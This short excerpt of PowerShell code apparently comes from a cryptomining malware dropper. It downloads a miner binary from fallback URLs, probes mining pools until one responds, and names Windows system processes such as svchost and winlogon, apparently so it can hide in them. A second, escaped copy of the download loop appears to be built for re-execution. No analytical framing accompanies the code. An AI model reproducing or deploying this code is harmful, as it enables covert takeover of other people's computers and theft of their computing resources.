...
$wc.Timeout=60000
$minerBytes=$null
foreach($url in @($u1,$u2)){try{$minerBytes=$wc.DownloadData($url);if($minerBytes.Length -gt 1000000){break}}catch{Start-Sleep 5}}
...
$activePool=$null
foreach($pool in @($pool1,$pool2)){
    try{$wc.DownloadString("http://$pool/")|Out-Null;$activePool=$pool;break}catch{Start-Sleep 1}
}
...
$proc=$null
$processNames=@("svchost","explorer","winlogon","spoolsv")
...
`$wc=New-Object Net.WebClient
`$b=`$null
foreach(`$u in @(`$u1,`$u2)){try{`$b=`$wc.DownloadData(`$u);if(`$b.Length -gt 1000000){break}}catch{}}
